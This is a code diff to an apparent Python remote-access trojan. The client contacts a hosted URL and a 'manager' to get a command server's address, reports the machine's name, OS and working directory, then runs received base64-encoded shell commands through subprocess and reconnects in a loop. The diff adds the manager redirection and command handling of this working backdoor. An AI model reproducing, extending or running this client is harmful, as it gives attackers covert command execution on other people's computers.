@@ -21,6 +21,9 @@ defPort = 1337
 url = "http://galacticdiversion.x10host.com/ip"
 ip = 'localhost'
 
+serverIP = ""
+serverPort = 0
+
 quitting = False
 
 def checkCom(command):
@@ -45,23 +48,29 @@ def receive():
 
 	received = base64.decodebytes(s.recv(1024)).decode('utf8')
 	
-	if checkCom('quit'):
+	if checkCom('exit'):
 		quitting = True
 		s.close()
 
-	elif checkCom('reset'):
+	elif checkCom('quit'):
 		s.close()
 
 	elif checkCom('shell'):
-		proc2 = subprocess.Popen(received, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-		stdout_value = proc2.stdout.read() + proc2.stderr.read()
-		args = stdout_value
+		if received:
+			proc2 = subprocess.Popen(received, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+			stdout_value = proc2.stdout.read() + proc2.stderr.read()
+			args = stdout_value
+		else:
+			args = "No Command Provided"
 
 	elif checkCom('shellThread'):
-		process = Thread(target=runShell, args=[received])
-		process.start()
-		process.join()
-		args = 'Ran Command'
+		if received:
+			process = Thread(target=runShell, args=[received])
+			process.start()
+			process.join()
+			args = 'Ran Command'
+		else:
+			args = "No Command Provided"
 
 	elif checkCom('cwd'):
 		args = currentPath
@@ -138,21 +147,47 @@ def send(args):
 	receive()
 
 def connect():
+	
 	notConnected = True
 	while notConnected:
 		global host, port, s
-		port = int(port)
-
+		print("Attempting To Connect To Server at: " + serverIP + " - " + str(serverPort))
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 		try:
 			# print('[!] Trying To Connect To %s:%s'%(host, port))
-			s.connect((host,port))
+			s.connect((serverIP, serverPort))
 			# print('[*] Connection Established')
 			s.send((str(os.environ['COMPUTERNAME']) + ',' + platform.system() + ',' + currentPath).encode('utf8'))
 			notConnected = False
+
 		except Exception as e:
-			print('Could Not Connect: ', e)
+			pass
+			
+
+def connectToManager():
+	notConnected = True
+	
+	while notConnected:
+		global host, port, serverIP, serverPort
+		print("Attempting To Connect To Manager at: " + ip + ' - ' + str(port))
+		port = int(port)
+
+		mS = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+		try:
+			mS.connect((host,port))
+			
+
+			mS.send((str(os.environ['COMPUTERNAME']) + ',' + platform.system() + ',' + currentPath).encode('utf8'))
+			data = mS.recv(1024).decode().split(',')
+			serverPort = int(data[0])
+			serverIP = data[1]
+			notConnected = False
+
+		except Exception as e:
+			# print('Could Not Connect To Manager: ', e)
+			pass
 
 def reset():
 	global received, currentPath, host, url, ip, port, portUrl, defPort
@@ -168,12 +203,16 @@ while not quitting:
 	reset()
 	# print("Starting Client")
 	try:
+		connectToManager()
 		connect()
 		receive()
 		s.close()
-	except:
-		print("Cut Out Of Loop")
+	except Exception as e:
+		print("Cut Out Of Loop: ", e)
 
 
 	if not quitting:
 		time.sleep(waitInLoop * 60)
+
+print("Shutting Down")
+sys.exit()
